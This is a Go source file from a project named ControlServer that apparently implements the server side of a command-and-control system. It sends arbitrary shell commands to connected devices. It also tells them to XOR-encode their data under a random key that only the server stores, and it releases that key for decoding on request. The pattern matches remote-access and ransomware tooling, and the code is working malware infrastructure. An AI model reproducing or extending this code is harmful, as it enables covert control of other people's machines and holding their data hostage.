package commands

import (
	"ControlServer/graph/model"
	"ControlServer/internal/device"
	"ControlServer/pkg/database"
	"encoding/json"
	"go.mongodb.org/mongo-driver/bson"
	"go.mongodb.org/mongo-driver/bson/primitive"
	"log"
	"math/rand"
)

const letterBytes = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

type DeviceCommand struct {
	Method  string `json:"method"`
	Command string `json:"command"`
}

type EncodedData struct {
	ID       primitive.ObjectID `json:"id" bson:"_id"`
	DeviceID primitive.ObjectID `json:"device_id" bson:"device_id"`
	Key      string             `json:"key" bson:"key"`
}

type EncoderCommand struct {
	Method      string `json:"method"`
	Key         string `json:"key"`
	EncoderType string `json:"encoder_type"`
}

func RunCommand(input model.Command) (*model.CommandOutput, error) {
	var deviceInfo device.Device
	objectId, _ := primitive.ObjectIDFromHex(input.DeviceID)

	err := database.FindOne(&deviceInfo, bson.M{"_id": objectId}, "device")

	if err != nil {
		return nil, err
	}

	conn := deviceInfo.GetConnection()

	var commandOutput model.CommandOutput

	if conn == nil {
		commandOutput.Output = "Device offline"
		commandOutput.Code = 1

		return &commandOutput, nil
	}

	command := DeviceCommand{"run", input.Command}
	jsonCommand, err := json.Marshal(command)

	if err != nil {
		log.Println(err)
		return nil, err
	}

	if err = conn.WriteMessage(1, jsonCommand); err != nil {
		log.Println(err)
		return nil, err
	}

	commandOutput.Output = "Done"
	commandOutput.Code = 0

	return &commandOutput, nil
}

func RandStringBytes(n int) string {
	b := make([]byte, n)
	for i := range b {
		b[i] = letterBytes[rand.Intn(len(letterBytes))]
	}
	return string(b)
}

func Encode(input model.Encode) (*model.CommandOutput, error) {
	var deviceInfo device.Device
	objectId, _ := primitive.ObjectIDFromHex(input.DeviceID)

	err := database.FindOne(&deviceInfo, bson.M{"_id": objectId}, "device")

	if err != nil {
		return nil, err
	}

	conn := deviceInfo.GetConnection()

	var commandOutput model.CommandOutput

	if conn == nil {
		commandOutput.Output = "Device offline"
		commandOutput.Code = 1

		return &commandOutput, nil
	}

	var encodedData EncodedData

	err = database.FindOne(&encodedData, bson.M{"device_id": objectId}, "encoded")

	if err == nil || !encodedData.ID.IsZero() {
		commandOutput.Output = "Already encoded!"
		commandOutput.Code = 1

		return &commandOutput, nil
	}

	key := RandStringBytes(25)

	encodedData.DeviceID = objectId
	encodedData.Key = key
	err = database.CreateNewDocument(&encodedData, "encoded")

	if err != nil {
		log.Println(err)
		return nil, err
	}

	command := EncoderCommand{"encode", key, "XOR"}
	jsonCommand, err := json.Marshal(command)

	if err != nil {
		log.Println(err)
		return nil, err
	}

	if err = conn.WriteMessage(1, jsonCommand); err != nil {
		log.Println(err)
		return nil, err
	}

	commandOutput.Output = "Done"
	commandOutput.Code = 0

	return &commandOutput, nil
}

func Decode(input model.Decode) (*model.CommandOutput, error) {
	var deviceInfo device.Device
	objectId, _ := primitive.ObjectIDFromHex(input.DeviceID)

	err := database.FindOne(&deviceInfo, bson.M{"_id": objectId}, "device")

	if err != nil {
		return nil, err
	}

	conn := deviceInfo.GetConnection()

	var commandOutput model.CommandOutput

	if conn == nil {
		commandOutput.Output = "Device offline"
		commandOutput.Code = 1

		return &commandOutput, nil
	}

	var encodedData EncodedData

	err = database.FindOne(&encodedData, bson.M{"device_id": objectId}, "encoded")

	if err != nil || encodedData.ID.IsZero() {
		commandOutput.Output = "Not encoded!"
		commandOutput.Code = 1

		return &commandOutput, nil
	}

	command := EncoderCommand{"decode", encodedData.Key, "XOR"}
	jsonCommand, err := json.Marshal(command)

	if err != nil {
		log.Println(err)
		return nil, err
	}

	if err = conn.WriteMessage(1, jsonCommand); err != nil {
		log.Println(err)
		return nil, err
	}

	_ = database.RemoveOne(&encodedData, "encoded")

	commandOutput.Output = "Done"
	commandOutput.Code = 0

	return &commandOutput, nil
}
